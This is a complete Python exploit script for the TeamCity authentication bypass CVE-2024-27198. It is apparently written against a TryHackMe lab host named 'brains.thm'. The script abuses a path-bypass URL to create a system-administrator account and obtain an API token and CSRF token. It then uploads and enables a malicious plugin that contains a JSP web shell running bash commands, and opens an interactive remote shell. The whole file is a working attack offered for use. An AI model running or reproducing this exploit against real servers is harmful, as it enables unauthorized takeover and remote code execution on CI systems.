import requests
import re
import zipfile
import os
import sys
import time
import random
import string
import xml.etree.ElementTree as ET


TARGET = "http://brains.thm:50000"
# Random names to avoid conflicts in repeated executions
PLUGIN_NAME = "".join(random.choices(string.ascii_lowercase, k=8))
TOKEN_NAME = "".join(random.choices(string.ascii_letters + string.digits, k=10))

USER_DATA = {
    "username": "joey".join(random.choices(string.ascii_lowercase, k=6)),
    "password": "daenerys_pass",
    "email": "joey@local.com",
    "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
}

VERIFY_TLS = False
TIMEOUT = 30

# Terminal colors
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
RESET = "\033[0m"

session = requests.Session()

def add_user(target, user_data):
    url = f"{target.rstrip('/')}/hax?jsp=/app/rest/users;.jsp"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    try:
        r = session.post(url, json=user_data, headers=headers, verify=VERIFY_TLS, timeout=TIMEOUT)
        root = ET.fromstring(r.text)
        user_id = root.attrib.get("id")
        if r.status_code == 200 and user_id:
            print(f"[+] User created: {GREEN}{user_data['username']}{RESET} (ID: {user_id})")
            return user_id
    except Exception as e:
        print(f"[-] Error creating user: {e}")
    return None

def get_token(target, user_id):
    url = f"{target.rstrip('/')}/hax?jsp=/app/rest/users/id:{user_id}/tokens/{TOKEN_NAME};.jsp"
    try:
        r = session.post(url, verify=VERIFY_TLS, timeout=TIMEOUT)
        root = ET.fromstring(r.text)
        token_value = root.attrib.get("value")
        if token_value:
            print(f"[+] Token obtained: {GREEN}{token_value[:15]}...{RESET}")
            return token_value
    except Exception as e:
        print(f"[-] Failed to parse token XML.")
    return None

def get_csrf(target, token):
    url = f"{target.rstrip('/')}/authenticationTest.html?csrf"
    headers = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
    r = session.post(url, headers=headers, verify=VERIFY_TLS, timeout=TIMEOUT)
    if r.status_code == 200:
        print(f"[+] CSRF obtained: {GREEN}{r.text.strip()}{RESET}")
        return r.text.strip()
    return None

def build_zip(plugin_name):
    jar_name = f"{plugin_name}.jar"
    zip_name = f"{plugin_name}.zip"
    
    # JSP Payload (executes commands in Linux)
    jsp = r"""<%@ page import="java.util.Scanner" %><% String q = request.getParameter("cmd"); if (q != null) { Process p = new ProcessBuilder("/bin/bash","-c",q).start(); Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A"); out.print(sc.hasNext() ? sc.next() : ""); sc.close(); } %>"""
    
    xml = f"""<teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:schemas-jetbrains-com:teamcity-plugin-v1-xml">
    <info>
        <name>{plugin_name}</name>
        <display-name>{plugin_name}</display-name>
        <version>1.0</version>
    </info>
    <deployment use-separate-classloader="true"/>
</teamcity-plugin>"""
    
    with zipfile.ZipFile(jar_name, "w") as j:
        j.writestr(f"buildServerResources/{plugin_name}.jsp", jsp)
    
    with zipfile.ZipFile(zip_name, "w") as z:
        z.write(jar_name, arcname=f"server/{plugin_name}.jar")
        z.writestr("teamcity-plugin.xml", xml)
    
    os.remove(jar_name)
    print(f"[+] Local plugin {zip_name} built.")

def upload_and_run(target, token, csrf, plugin_name):
    # Upload endpoint
    url = f"{target.rstrip('/')}/admin/pluginUpload.html"
    
    # Clearing cookies to avoid session conflicts
    session.cookies.clear()
    
    headers = {
        "Authorization": f"Bearer {token}",
        "X-TC-CSRF-Token": csrf,
        "User-Agent": "Mozilla/5.0"
    }
    
    zip_filename = f"{plugin_name}.zip"
    files = {
        "fileName": (None, zip_filename),
        "file:fileToUpload": (zip_filename, open(zip_filename, "rb").read(), "application/zip")
    }
    
    print(f"[*] Uploading plugin {BLUE}{plugin_name}{RESET}...")
    r = session.post(url, files=files, headers=headers, verify=VERIFY_TLS)
    
    if r.status_code == 200:
        print(f"[+] Upload accepted. Waiting for server processing...")
        
        # TeamCity needs a few seconds to unzip and index the plugin
        uuid = None
        for i in range(15):
            time.sleep(1)
            admin_url = f"{target.rstrip('/')}/admin/admin.html?item=plugins"
            r_admin = session.get(admin_url, headers=headers)
            
            # Regex to capture the plugin UUID
            pattern = r"BS\.Plugins\.registerPlugin\('([^']*)', '[^']*',[^,]*,[^,]*,\s*'([^']*)'\);"
            matches = re.findall(pattern, r_admin.text)
            
            for name, u in matches:
                if name == plugin_name:
                    uuid = u
                    break
            if uuid: break
            if i % 5 == 0: print(f"[*] Checking index... ({i}/15s)")

        if uuid:
            print(f"[+] Plugin UUID found: {GREEN}{uuid}{RESET}. Activating...")
            
            # Plugin activation
            act_url = f"{target.rstrip('/')}/admin/plugins.html"
            act_data = f"enabled=true&action=setEnabled&uuid={uuid}"
            act_headers = headers.copy()
            act_headers["Content-Type"] = "application/x-www-form-urlencoded"
            
            session.post(act_url, data=act_data, headers=act_headers)
            print(f"[+] Plugin activated successfully!")
            
            # Interactive Terminal
            shell_url = f"{target.rstrip('/')}/plugins/{plugin_name}/{plugin_name}.jsp"
            print(f"\n{YELLOW}[!] RCE Terminal ready. Type 'quit' to exit.{RESET}")
            
            while True:
                cmd = input(f"{GREEN}shell> {RESET}")
                if cmd.lower() in ["quit", "exit"]:
                    break
                
                res = session.post(shell_url, data={"cmd": cmd}, headers=headers)
                print(res.text.strip())
        else:
            print(f"{RED}[-] Plugin upload done but UUID not found. Try increasing wait time.{RESET}")
    else:
        print(f"{RED}[-] Upload failed. Status Code: {r.status_code}{RESET}")

if __name__ == "__main__":
    print(f"{YELLOW}[*] Starting Exploit CVE-2024-27198...{RESET}")
    
    user_id = add_user(TARGET, USER_DATA)
    if user_id:
        api_token = get_token(TARGET, user_id)
        if api_token:
            csrf_token = get_csrf(TARGET, api_token)
            if csrf_token:
                build_zip(PLUGIN_NAME)
                upload_and_run(TARGET, api_token, csrf_token, PLUGIN_NAME)
            else:
                print(f"{RED}[-] Failed to obtain CSRF token.{RESET}")
        else:
            print(f"{RED}[-] Failed to obtain API token.{RESET}")
    else:
        print(f"{RED}[-] Failed to create user. Target might not be vulnerable.{RESET}")
